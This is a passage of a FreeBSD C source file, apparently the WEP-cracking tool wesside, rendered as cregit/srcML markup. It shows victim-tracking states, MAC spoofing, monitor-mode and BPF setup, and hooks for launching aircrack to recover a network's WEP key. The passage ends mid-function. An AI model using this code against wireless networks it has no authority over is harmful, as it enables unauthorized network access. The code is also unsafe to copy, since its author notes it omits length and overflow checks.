begin_unit|revision:0.9.5;language:C;cregit-version:0.0.1
begin_comment
comment|/*  * wep owner by sorbo<sorbox@yahoo.com>  * Aug 2005  *  * XXX GENERAL: I DON'T CHECK FOR PACKET LENGTHS AND STUFF LIKE THAT and buffer  * overflows.  this whole thing is experimental n e way.  *  * $FreeBSD$  */
end_comment

begin_include
include|#
directive|include
file|<sys/types.h>
end_include

begin_include
include|#
directive|include
file|<sys/socket.h>
end_include

begin_include
include|#
directive|include
file|<sys/ioctl.h>
end_include

begin_include
include|#
directive|include
file|<sys/endian.h>
end_include

begin_include
include|#
directive|include
file|<sys/stat.h>
end_include

begin_include
include|#
directive|include
file|<sys/wait.h>
end_include

begin_include
include|#
directive|include
file|<sys/uio.h>
end_include

begin_include
include|#
directive|include
file|<net/if.h>
end_include

begin_include
include|#
directive|include
file|<net/if_media.h>
end_include

begin_include
include|#
directive|include
file|<net/if_llc.h>
end_include

begin_include
include|#
directive|include
file|<net/if_arp.h>
end_include

begin_include
include|#
directive|include
file|<net/if_types.h>
end_include

begin_include
include|#
directive|include
file|<net/if_dl.h>
end_include

begin_include
include|#
directive|include
file|<net/bpf.h>
end_include

begin_include
include|#
directive|include
file|<net/ethernet.h>
end_include

begin_include
include|#
directive|include
file|<net80211/ieee80211.h>
end_include

begin_include
include|#
directive|include
file|<net80211/ieee80211_ioctl.h>
end_include

begin_include
include|#
directive|include
file|<net80211/ieee80211_radiotap.h>
end_include

begin_include
include|#
directive|include
file|<net80211/ieee80211_freebsd.h>
end_include

begin_include
include|#
directive|include
file|<netinet/in.h>
end_include

begin_include
include|#
directive|include
file|<netinet/in_systm.h>
end_include

begin_include
include|#
directive|include
file|<netinet/ip.h>
end_include

begin_include
include|#
directive|include
file|<netinet/udp.h>
end_include

begin_include
include|#
directive|include
file|<arpa/inet.h>
end_include

begin_include
include|#
directive|include
file|<stdlib.h>
end_include

begin_include
include|#
directive|include
file|<stdio.h>
end_include

begin_include
include|#
directive|include
file|<unistd.h>
end_include

begin_include
include|#
directive|include
file|<string.h>
end_include

begin_include
include|#
directive|include
file|<fcntl.h>
end_include

begin_include
include|#
directive|include
file|<errno.h>
end_include

begin_include
include|#
directive|include
file|<assert.h>
end_include

begin_include
include|#
directive|include
file|<zlib.h>
end_include

begin_include
include|#
directive|include
file|<signal.h>
end_include

begin_include
include|#
directive|include
file|<stdarg.h>
end_include

begin_include
include|#
directive|include
file|<err.h>
end_include

begin_include
include|#
directive|include
file|<pcap.h>
end_include

begin_include
include|#
directive|include
file|"aircrack-ptw-lib.h"
end_include

begin_define
define|#
directive|define
name|FIND_VICTIM
value|0
end_define

begin_define
define|#
directive|define
name|FOUND_VICTIM
value|1
end_define

begin_define
define|#
directive|define
name|SENDING_AUTH
value|2
end_define

begin_define
define|#
directive|define
name|GOT_AUTH
value|3
end_define

begin_define
define|#
directive|define
name|SPOOF_MAC
value|4
end_define

begin_define
define|#
directive|define
name|SENDING_ASSOC
value|5
end_define

begin_define
define|#
directive|define
name|GOT_ASSOC
value|6
end_define

begin_decl_stmt
name|int
name|state
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|struct
name|timeval
name|arpsend
decl_stmt|;
end_decl_stmt

begin_struct
struct|struct
name|tx_state
block|{
name|int
name|waiting_ack
decl_stmt|;
name|struct
name|timeval
name|tsent
decl_stmt|;
name|int
name|retries
decl_stmt|;
name|unsigned
name|int
name|psent
decl_stmt|;
block|}
name|txstate
struct|;
end_struct

begin_struct
struct|struct
name|chan_info
block|{
name|int
name|s
decl_stmt|;
name|struct
name|ieee80211req
name|ireq
decl_stmt|;
name|int
name|chan
decl_stmt|;
block|}
name|chaninfo
struct|;
end_struct

begin_struct
struct|struct
name|victim_info
block|{
name|char
modifier|*
name|ssid
decl_stmt|;
name|int
name|chan
decl_stmt|;
name|char
name|bss
index|[
literal|6
index|]
decl_stmt|;
block|}
name|victim
struct|;
end_struct

begin_struct
struct|struct
name|frag_state
block|{
name|struct
name|ieee80211_frame
name|wh
decl_stmt|;
name|unsigned
name|char
modifier|*
name|data
decl_stmt|;
name|int
name|len
decl_stmt|;
name|unsigned
name|char
modifier|*
name|ptr
decl_stmt|;
name|int
name|waiting_relay
decl_stmt|;
name|struct
name|timeval
name|last
decl_stmt|;
block|}
name|fragstate
struct|;
end_struct

begin_struct
struct|struct
name|prga_info
block|{
name|unsigned
name|char
modifier|*
name|prga
decl_stmt|;
name|unsigned
name|int
name|len
decl_stmt|;
name|unsigned
name|char
name|iv
index|[
literal|3
index|]
decl_stmt|;
block|}
name|prgainfo
struct|;
end_struct

begin_struct
struct|struct
name|decrypt_state
block|{
name|unsigned
name|char
modifier|*
name|cipher
decl_stmt|;
name|int
name|clen
decl_stmt|;
name|struct
name|prga_info
name|prgainfo
decl_stmt|;
name|struct
name|frag_state
name|fragstate
decl_stmt|;
block|}
name|decryptstate
struct|;
end_struct

begin_struct
struct|struct
name|wep_log
block|{
name|unsigned
name|int
name|packets
decl_stmt|;
name|unsigned
name|int
name|rate
decl_stmt|;
name|int
name|fd
decl_stmt|;
name|unsigned
name|char
name|iv
index|[
literal|3
index|]
decl_stmt|;
block|}
name|weplog
struct|;
end_struct

begin_define
define|#
directive|define
name|LINKTYPE_IEEE802_11
value|105
end_define

begin_define
define|#
directive|define
name|TCPDUMP_MAGIC
value|0xA1B2C3D4
end_define

begin_decl_stmt
name|unsigned
name|char
modifier|*
name|floodip
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|short
name|floodport
init|=
literal|6969
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|short
name|floodsport
init|=
literal|53
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
modifier|*
name|netip
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|netip_arg
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|max_chan
init|=
literal|11
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
modifier|*
name|rtrmac
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
name|mymac
index|[]
init|=
literal|"\x00\x00\xde\xfa\xce\x0d"
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
name|myip
index|[
literal|16
index|]
init|=
literal|"192.168.0.123"
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|bits
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|ttl_val
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|PTW_attackstate
modifier|*
name|ptw
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
modifier|*
name|victim_mac
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|ack_timeout
init|=
literal|100
operator|*
literal|1000
decl_stmt|;
end_decl_stmt

begin_define
define|#
directive|define
name|ARPLEN
value|(8+ 8 + 20)
end_define

begin_decl_stmt
name|unsigned
name|char
name|arp_clear
index|[]
init|=
literal|"\xAA\xAA\x03\x00\x00\x00\x08\x06"
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
name|ip_clear
index|[]
init|=
literal|"\xAA\xAA\x03\x00\x00\x00\x08\x00"
decl_stmt|;
end_decl_stmt

begin_define
define|#
directive|define
name|S_LLC_SNAP
value|"\xAA\xAA\x03\x00\x00\x00"
end_define

begin_define
define|#
directive|define
name|S_LLC_SNAP_ARP
value|(S_LLC_SNAP "\x08\x06")
end_define

begin_define
define|#
directive|define
name|S_LLC_SNAP_IP
value|(S_LLC_SNAP "\x08\x00")
end_define

begin_define
define|#
directive|define
name|MCAST_PREF
value|"\x01\x00\x5e\x00\x00"
end_define

begin_define
define|#
directive|define
name|WEP_FILE
value|"wep.cap"
end_define

begin_define
define|#
directive|define
name|KEY_FILE
value|"key.log"
end_define

begin_define
define|#
directive|define
name|PRGA_FILE
value|"prga.log"
end_define

begin_decl_stmt
name|unsigned
name|int
name|min_prga
init|=
literal|128
decl_stmt|;
end_decl_stmt

begin_comment
comment|/*  * When starting aircrack we try first to use a  * local copy, falling back to where the installed  * version is expected.  * XXX builtin pathnames  */
end_comment

begin_define
define|#
directive|define
name|CRACK_LOCAL_CMD
value|"../aircrack/aircrack"
end_define

begin_define
define|#
directive|define
name|CRACK_INSTALL_CMD
value|"/usr/local/bin/aircrack"
end_define

begin_define
define|#
directive|define
name|INCR
value|10000
end_define

begin_decl_stmt
name|int
name|thresh_incr
init|=
name|INCR
decl_stmt|;
end_decl_stmt

begin_define
define|#
directive|define
name|MAGIC_TTL_PAD
value|69
end_define

begin_decl_stmt
name|int
name|crack_dur
init|=
literal|60
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|wep_thresh
init|=
name|INCR
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|crack_pid
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|struct
name|timeval
name|crack_start
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|struct
name|timeval
name|real_start
decl_stmt|;
end_decl_stmt

begin_comment
comment|/* linksys does this.  The hardware pads small packets. */
end_comment

begin_define
define|#
directive|define
name|PADDED_ARPLEN
value|54
end_define

begin_define
define|#
directive|define
name|PRGA_LEN
value|(1500-14-20-8)
end_define

begin_decl_stmt
name|unsigned
name|char
name|inet_clear
index|[
literal|8
operator|+
literal|20
operator|+
literal|8
operator|+
name|PRGA_LEN
operator|+
literal|4
index|]
decl_stmt|;
end_decl_stmt

begin_define
define|#
directive|define
name|DICT_PATH
value|"dict"
end_define

begin_define
define|#
directive|define
name|TAP_DEV
value|"/dev/tap3"
end_define

begin_decl_stmt
name|unsigned
name|char
name|tapdev
index|[
literal|16
index|]
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|char
name|taptx
index|[
literal|4096
index|]
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|unsigned
name|int
name|taptx_len
init|=
literal|0
decl_stmt|;
end_decl_stmt

begin_decl_stmt
name|int
name|tapfd
init|=
operator|-
literal|1
decl_stmt|;
end_decl_stmt

begin_comment
comment|/********** RIPPED ************/
end_comment

begin_function
name|unsigned
name|short
name|in_cksum
parameter_list|(
name|unsigned
name|short
modifier|*
name|ptr
parameter_list|,
name|int
name|nbytes
parameter_list|)
block|{
specifier|register
name|long
name|sum
decl_stmt|;
name|u_short
name|oddbyte
decl_stmt|;
specifier|register
name|u_short
name|answer
decl_stmt|;
name|sum
operator|=
literal|0
expr_stmt|;
while|while
condition|(
name|nbytes
operator|>
literal|1
condition|)
block|{
name|sum
operator|+=
operator|*
name|ptr
operator|++
expr_stmt|;
name|nbytes
operator|-=
literal|2
expr_stmt|;
block|}
if|if
condition|(
name|nbytes
operator|==
literal|1
condition|)
block|{
name|oddbyte
operator|=
literal|0
expr_stmt|;
operator|*
operator|(
operator|(
name|u_char
operator|*
operator|)
operator|&
name|oddbyte
operator|)
operator|=
operator|*
operator|(
name|u_char
operator|*
operator|)
name|ptr
expr_stmt|;
name|sum
operator|+=
name|oddbyte
expr_stmt|;
block|}
name|sum
operator|=
operator|(
name|sum
operator|>>
literal|16
operator|)
operator|+
operator|(
name|sum
operator|&
literal|0xffff
operator|)
expr_stmt|;
name|sum
operator|+=
operator|(
name|sum
operator|>>
literal|16
operator|)
expr_stmt|;
name|answer
operator|=
operator|~
name|sum
expr_stmt|;
return|return
operator|(
name|answer
operator|)
return|;
block|}
end_function

begin_comment
comment|/************** ************/
end_comment

begin_function
name|unsigned
name|int
name|udp_checksum
parameter_list|(
name|unsigned
name|char
modifier|*
name|stuff
parameter_list|,
name|int
name|len
parameter_list|,
name|struct
name|in_addr
modifier|*
name|sip
parameter_list|,
name|struct
name|in_addr
modifier|*
name|dip
parameter_list|)
block|{
name|unsigned
name|char
modifier|*
name|tmp
decl_stmt|;
name|struct
name|ippseudo
modifier|*
name|ph
decl_stmt|;
name|tmp
operator|=
operator|(
name|unsigned
name|char
operator|*
operator|)
name|malloc
argument_list|(
name|len
operator|+
sizeof|sizeof
argument_list|(
expr|struct
name|ippseudo
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|tmp
condition|)
name|err
argument_list|(
literal|1
argument_list|,
literal|"malloc()"
argument_list|)
expr_stmt|;
name|ph
operator|=
operator|(
expr|struct
name|ippseudo
operator|*
operator|)
name|tmp
expr_stmt|;
name|memcpy
argument_list|(
operator|&
name|ph
operator|->
name|ippseudo_src
argument_list|,
name|sip
argument_list|,
literal|4
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
operator|&
name|ph
operator|->
name|ippseudo_dst
argument_list|,
name|dip
argument_list|,
literal|4
argument_list|)
expr_stmt|;
name|ph
operator|->
name|ippseudo_pad
operator|=
literal|0
expr_stmt|;
name|ph
operator|->
name|ippseudo_p
operator|=
name|IPPROTO_UDP
expr_stmt|;
name|ph
operator|->
name|ippseudo_len
operator|=
name|htons
argument_list|(
name|len
argument_list|)
expr_stmt|;
name|memcpy
argument_list|(
name|tmp
operator|+
sizeof|sizeof
argument_list|(
expr|struct
name|ippseudo
argument_list|)
argument_list|,
name|stuff
argument_list|,
name|len
argument_list|)
expr_stmt|;
return|return
name|in_cksum
argument_list|(
operator|(
name|unsigned
name|short
operator|*
operator|)
name|tmp
argument_list|,
name|len
operator|+
sizeof|sizeof
argument_list|(
expr|struct
name|ippseudo
argument_list|)
argument_list|)
return|;
block|}
end_function

begin_function
name|void
name|time_print
parameter_list|(
name|char
modifier|*
name|fmt
parameter_list|,
modifier|...
parameter_list|)
block|{
name|va_list
name|ap
decl_stmt|;
name|char
name|lame
index|[
literal|1024
index|]
decl_stmt|;
name|time_t
name|tt
decl_stmt|;
name|struct
name|tm
modifier|*
name|t
decl_stmt|;
name|va_start
argument_list|(
name|ap
argument_list|,
name|fmt
argument_list|)
expr_stmt|;
name|vsnprintf
argument_list|(
name|lame
argument_list|,
sizeof|sizeof
argument_list|(
name|lame
argument_list|)
argument_list|,
name|fmt
argument_list|,
name|ap
argument_list|)
expr_stmt|;
name|va_end
argument_list|(
name|ap
argument_list|)
expr_stmt|;
name|tt
operator|=
name|time
argument_list|(
name|NULL
argument_list|)
expr_stmt|;
if|if
condition|(
name|tt
operator|==
operator|(
name|time_t
operator|)
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"time()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|t
operator|=
name|localtime
argument_list|(
operator|&
name|tt
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|t
condition|)
block|{
name|perror
argument_list|(
literal|"localtime()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|printf
argument_list|(
literal|"[%.2d:%.2d:%.2d] %s"
argument_list|,
name|t
operator|->
name|tm_hour
argument_list|,
name|t
operator|->
name|tm_min
argument_list|,
name|t
operator|->
name|tm_sec
argument_list|,
name|lame
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|check_key
parameter_list|()
block|{
name|char
name|buf
index|[
literal|1024
index|]
decl_stmt|;
name|int
name|fd
decl_stmt|;
name|int
name|rd
decl_stmt|;
name|struct
name|timeval
name|now
decl_stmt|;
name|fd
operator|=
name|open
argument_list|(
name|KEY_FILE
argument_list|,
name|O_RDONLY
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|==
operator|-
literal|1
condition|)
block|{
return|return;
block|}
name|rd
operator|=
name|read
argument_list|(
name|fd
argument_list|,
name|buf
argument_list|,
sizeof|sizeof
argument_list|(
name|buf
argument_list|)
operator|-
literal|1
argument_list|)
expr_stmt|;
if|if
condition|(
name|rd
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"read()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|buf
index|[
name|rd
index|]
operator|=
literal|0
expr_stmt|;
name|close
argument_list|(
name|fd
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"\n\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"KEY=(%s)\n"
argument_list|,
name|buf
argument_list|)
expr_stmt|;
if|if
condition|(
name|gettimeofday
argument_list|(
operator|&
name|now
argument_list|,
name|NULL
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|printf
argument_list|(
literal|"Owned in %.02f minutes\n"
argument_list|,
operator|(
operator|(
name|double
operator|)
name|now
operator|.
name|tv_sec
operator|-
name|real_start
operator|.
name|tv_sec
operator|)
operator|/
literal|60.0
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|0
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|kill_crack
parameter_list|()
block|{
if|if
condition|(
name|crack_pid
operator|==
literal|0
condition|)
return|return;
name|printf
argument_list|(
literal|"\n"
argument_list|)
expr_stmt|;
name|time_print
argument_list|(
literal|"Stopping crack PID=%d\n"
argument_list|,
name|crack_pid
argument_list|)
expr_stmt|;
comment|// XXX doesn't return -1 for some reason! [maybe on my box... so it
comment|// might be buggy on other boxes...]
if|if
condition|(
name|kill
argument_list|(
name|crack_pid
argument_list|,
name|SIGINT
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"kill()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|crack_pid
operator|=
literal|0
expr_stmt|;
name|check_key
argument_list|()
expr_stmt|;
block|}
end_function

begin_function
name|void
name|cleanup
parameter_list|(
name|int
name|x
parameter_list|)
block|{
name|time_print
argument_list|(
literal|"\nDying...\n"
argument_list|)
expr_stmt|;
if|if
condition|(
name|weplog
operator|.
name|fd
condition|)
name|close
argument_list|(
name|weplog
operator|.
name|fd
argument_list|)
expr_stmt|;
name|kill_crack
argument_list|()
expr_stmt|;
name|exit
argument_list|(
literal|0
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|set_chan
parameter_list|(
name|int
name|c
parameter_list|)
block|{
if|if
condition|(
name|c
operator|==
name|chaninfo
operator|.
name|chan
condition|)
return|return;
name|chaninfo
operator|.
name|ireq
operator|.
name|i_val
operator|=
name|c
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|chaninfo
operator|.
name|s
argument_list|,
name|SIOCS80211
argument_list|,
operator|&
name|chaninfo
operator|.
name|ireq
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCS80211) [chan]"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|chaninfo
operator|.
name|chan
operator|=
name|c
expr_stmt|;
block|}
end_function

begin_function
name|void
name|set_if_mac
parameter_list|(
name|unsigned
name|char
modifier|*
name|mac
parameter_list|,
name|unsigned
name|char
modifier|*
name|name
parameter_list|)
block|{
name|int
name|s
decl_stmt|;
name|struct
name|ifreq
name|ifr
decl_stmt|;
name|s
operator|=
name|socket
argument_list|(
name|PF_INET
argument_list|,
name|SOCK_DGRAM
argument_list|,
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|s
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"socket()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|name
argument_list|)
expr_stmt|;
name|ifr
operator|.
name|ifr_addr
operator|.
name|sa_family
operator|=
name|AF_LINK
expr_stmt|;
name|ifr
operator|.
name|ifr_addr
operator|.
name|sa_len
operator|=
literal|6
expr_stmt|;
name|memcpy
argument_list|(
name|ifr
operator|.
name|ifr_addr
operator|.
name|sa_data
argument_list|,
name|mac
argument_list|,
literal|6
argument_list|)
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCSIFLLADDR
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCSIFLLADDR)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|close
argument_list|(
name|s
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|void
name|setup_if
parameter_list|(
name|char
modifier|*
name|dev
parameter_list|)
block|{
name|int
name|s
decl_stmt|;
name|struct
name|ifreq
name|ifr
decl_stmt|;
name|unsigned
name|int
name|flags
decl_stmt|;
name|struct
name|ifmediareq
name|ifmr
decl_stmt|;
name|int
modifier|*
name|mwords
decl_stmt|;
if|if
condition|(
name|strlen
argument_list|(
name|dev
argument_list|)
operator|>=
name|IFNAMSIZ
condition|)
block|{
name|time_print
argument_list|(
literal|"Interface name too long...\n"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|time_print
argument_list|(
literal|"Setting up %s... "
argument_list|,
name|dev
argument_list|)
expr_stmt|;
name|fflush
argument_list|(
name|stdout
argument_list|)
expr_stmt|;
name|set_if_mac
argument_list|(
name|mymac
argument_list|,
name|dev
argument_list|)
expr_stmt|;
name|s
operator|=
name|socket
argument_list|(
name|PF_INET
argument_list|,
name|SOCK_DGRAM
argument_list|,
literal|0
argument_list|)
expr_stmt|;
if|if
condition|(
name|s
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"socket()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// set iface up and promisc
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|dev
argument_list|)
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCGIFFLAGS
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCGIFFLAGS)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|flags
operator|=
operator|(
name|ifr
operator|.
name|ifr_flags
operator|&
literal|0xffff
operator|)
operator||
operator|(
name|ifr
operator|.
name|ifr_flagshigh
operator|<<
literal|16
operator|)
expr_stmt|;
name|flags
operator||=
name|IFF_UP
operator||
name|IFF_PPROMISC
expr_stmt|;
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|dev
argument_list|)
expr_stmt|;
name|ifr
operator|.
name|ifr_flags
operator|=
name|flags
operator|&
literal|0xffff
expr_stmt|;
name|ifr
operator|.
name|ifr_flagshigh
operator|=
name|flags
operator|>>
literal|16
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCSIFFLAGS
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCSIFFLAGS)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// set monitor mode
name|memset
argument_list|(
operator|&
name|ifmr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifmr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifmr
operator|.
name|ifm_name
argument_list|,
name|dev
argument_list|)
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCGIFMEDIA
argument_list|,
operator|&
name|ifmr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCGIFMEDIA)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|ifmr
operator|.
name|ifm_count
operator|==
literal|0
condition|)
block|{
name|time_print
argument_list|(
literal|"0 media thinggies...\n"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|mwords
operator|=
operator|(
name|int
operator|*
operator|)
name|malloc
argument_list|(
name|ifmr
operator|.
name|ifm_count
operator|*
sizeof|sizeof
argument_list|(
name|int
argument_list|)
argument_list|)
expr_stmt|;
if|if
condition|(
operator|!
name|mwords
condition|)
block|{
name|perror
argument_list|(
literal|"malloc()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|ifmr
operator|.
name|ifm_ulist
operator|=
name|mwords
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCGIFMEDIA
argument_list|,
operator|&
name|ifmr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCGIFMEDIA)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|free
argument_list|(
name|mwords
argument_list|)
expr_stmt|;
name|memset
argument_list|(
operator|&
name|ifr
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|dev
argument_list|)
expr_stmt|;
name|ifr
operator|.
name|ifr_media
operator|=
name|ifmr
operator|.
name|ifm_current
operator||
name|IFM_IEEE80211_MONITOR
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|s
argument_list|,
name|SIOCSIFMEDIA
argument_list|,
operator|&
name|ifr
argument_list|)
operator|==
operator|-
literal|1
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(SIOCSIFMEDIA)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
comment|// set chan
name|memset
argument_list|(
operator|&
name|chaninfo
operator|.
name|ireq
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|chaninfo
operator|.
name|ireq
argument_list|)
argument_list|)
expr_stmt|;
name|strcpy
argument_list|(
name|chaninfo
operator|.
name|ireq
operator|.
name|i_name
argument_list|,
name|dev
argument_list|)
expr_stmt|;
name|chaninfo
operator|.
name|ireq
operator|.
name|i_type
operator|=
name|IEEE80211_IOC_CHANNEL
expr_stmt|;
name|chaninfo
operator|.
name|chan
operator|=
literal|0
expr_stmt|;
name|chaninfo
operator|.
name|s
operator|=
name|s
expr_stmt|;
name|set_chan
argument_list|(
literal|1
argument_list|)
expr_stmt|;
name|printf
argument_list|(
literal|"done\n"
argument_list|)
expr_stmt|;
block|}
end_function

begin_function
name|int
name|open_bpf
parameter_list|(
name|char
modifier|*
name|dev
parameter_list|,
name|int
name|dlt
parameter_list|)
block|{
name|int
name|i
decl_stmt|;
name|char
name|buf
index|[
literal|64
index|]
decl_stmt|;
name|int
name|fd
init|=
operator|-
literal|1
decl_stmt|;
name|struct
name|ifreq
name|ifr
decl_stmt|;
for|for
control|(
name|i
operator|=
literal|0
init|;
name|i
operator|<
literal|16
condition|;
name|i
operator|++
control|)
block|{
name|sprintf
argument_list|(
name|buf
argument_list|,
literal|"/dev/bpf%d"
argument_list|,
name|i
argument_list|)
expr_stmt|;
name|fd
operator|=
name|open
argument_list|(
name|buf
argument_list|,
name|O_RDWR
argument_list|)
expr_stmt|;
if|if
condition|(
name|fd
operator|<
literal|0
condition|)
block|{
if|if
condition|(
name|errno
operator|!=
name|EBUSY
condition|)
block|{
name|perror
argument_list|(
literal|"can't open /dev/bpf"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
continue|continue;
block|}
else|else
break|break;
block|}
if|if
condition|(
name|fd
operator|<
literal|0
condition|)
block|{
name|perror
argument_list|(
literal|"can't open /dev/bpf"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|strncpy
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|,
name|dev
argument_list|,
sizeof|sizeof
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|)
operator|-
literal|1
argument_list|)
expr_stmt|;
name|ifr
operator|.
name|ifr_name
index|[
sizeof|sizeof
argument_list|(
name|ifr
operator|.
name|ifr_name
argument_list|)
operator|-
literal|1
index|]
operator|=
literal|0
expr_stmt|;
if|if
condition|(
name|ioctl
argument_list|(
name|fd
argument_list|,
name|BIOCSETIF
argument_list|,
operator|&
name|ifr
argument_list|)
operator|<
literal|0
condition|)
block|{
name|perror
argument_list|(
literal|"ioctl(BIOCSETIF)"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
if|if
condition|(
name|ioctl
argument_list|(
name|fd
argument_list|,
name|BIOCSDLT
argument_list|,
operator|&
